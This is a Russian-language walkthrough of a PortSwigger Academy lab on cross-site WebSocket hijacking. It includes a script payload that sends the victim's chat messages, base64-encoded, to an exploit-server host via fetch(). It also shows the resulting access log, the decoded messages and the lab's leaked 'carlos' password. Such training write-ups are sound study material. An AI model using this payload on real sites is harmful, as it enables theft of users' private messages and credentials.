откроем уязвимый ресурс

перейдем на вкладку `Live chat`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/18.%20WebSockets/3.%20Cross-site%20WebSocket%20hijacking/pics%20for%20walkthrough/1.png)

Полное взаимодействие атаки будет выглядеть следующим образом
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/18.%20WebSockets/3.%20Cross-site%20WebSocket%20hijacking/pics%20for%20walkthrough/3.png)

Найдем в `Proxy` -> `HTTP history` `GET - запрос`, инициирующий соединение с сервером
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/18.%20WebSockets/3.%20Cross-site%20WebSocket%20hijacking/pics%20for%20walkthrough/2.png)

Перейдем в `Exploit server `

и сконфигурироуем данный `payload`
```
<script>
    var ws = new WebSocket('wss://0a25008e048f15a0814ef770009e005a.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch("https://exploit-0a8800d804ac15dd8195f6e901c7001a.exploit-server.net/exploit?message=" +btoa(event.data));
    };
</script>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/18.%20WebSockets/3.%20Cross-site%20WebSocket%20hijacking/pics%20for%20walkthrough/4.png)


Нажмем `Store` - > `Deliver exploit to victim`
и перейдем в `Access log`

и увидим следующие строки
```
10.0.4.21       2024-05-10 16:24:49 +0000 "GET /exploit?message=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6IkhlbGxvLCBob3cgY2FuIEkgaGVscD8ifQ== HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
10.0.4.21       2024-05-10 16:24:49 +0000 "GET /exploit?message=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IkkgZm9yZ290IG15IHBhc3N3b3JkIn0= HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
10.0.4.21       2024-05-10 16:24:49 +0000 "GET /exploit?message=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3MgM2phZ3F0a3R4cW5oOWtkNGlvNnoifQ== HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
10.0.4.21       2024-05-10 16:24:49 +0000 "GET /exploit?message=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IlRoYW5rcywgSSBob3BlIHRoaXMgZG9lc24mYXBvczt0IGNvbWUgYmFjayB0byBiaXRlIG1lISJ9 HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
10.0.4.21       2024-05-10 16:24:49 +0000 "GET /exploit?message=eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9 HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/18.%20WebSockets/3.%20Cross-site%20WebSocket%20hijacking/pics%20for%20walkthrough/5.png)

Декодировав, получим сообщения
```
{"user":"Hal Pline","content":"Hello, how can I help?"}

{"user":"You","content":"I forgot my password"}

{"user":"Hal Pline","content":"No problem carlos, it&apos;s 3jagqtktxqnh9kd4io6z"}

{"user":"You","content":"Thanks, I hope this doesn&apos;t come back to bite me!"}

{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/18.%20WebSockets/3.%20Cross-site%20WebSocket%20hijacking/pics%20for%20walkthrough/6.png)

Зайдем под кредами 
```
carlos:3jagqtktxqnh9kd4io6z
```
и получим сообщение об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/18.%20WebSockets/3.%20Cross-site%20WebSocket%20hijacking/pics%20for%20walkthrough/7.png)
